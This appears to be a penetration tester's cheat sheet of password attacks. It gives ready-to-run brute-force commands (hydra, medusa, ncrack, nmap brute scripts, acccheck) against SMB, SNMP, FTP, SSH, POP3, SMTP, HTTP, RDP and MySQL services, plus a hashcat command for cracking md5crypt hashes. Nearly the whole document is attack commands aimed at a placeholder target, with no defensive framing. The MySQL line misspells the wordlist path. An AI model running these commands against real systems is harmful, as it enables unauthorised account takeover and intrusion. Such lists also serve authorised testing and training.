# Password Attacks 

## Protocols 

### SMB
```bash
nmap -sV -p 445 --script=smb-brute.nse $target
```
```bash
perl $pwd/public/tools/windows/acccheck.pl -t $target -U $pwd/public/lists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt
```

### SNMP
```bash
hydra -P /usr/share/wordlists/rockyou.txt -v $target snmp
```

### FTP
```bash
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $target ftp
```

### SSH
```bash
hydra -t 4 -v -V -u -L $pwd/public/lists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 1 -u $target ssh
```

### POP3
Hydra POP3 Brute Force
```bash
hydra -L $pwd/public/lists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -f $target pop3 -V
```

### SMTP
```bash
hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w 20 -f $target smtp
```

### HTTP
```bash
hydra $pwd/public/lists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt $target http-get /admin
```
```bash
medusa -h $target -u {jeff,admin} -P /usr/share/wordlists/rockyou.txt -M http -n 80 -m DIR:/xampp -T 3
```

### RDP 
```bash
ncrack -vv --user administrator -P /usr/share/wordlists/rockyou.txt rdp://$target
```
```bash
hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$target
```

## Hashes

### md5crypt
md5crypt passwords \$1\$:
```bash
hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt
```

### htaccess
```bash
medusa -h $target -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin -T 10
```

### MySQL
```bash
nmap -p 3306 --script mysql-brute --script-args userdb=/usr/share/wordlists/mysql_users.txt,passdb=/usr/share/wordists/rockyou.txt -vv $target
```
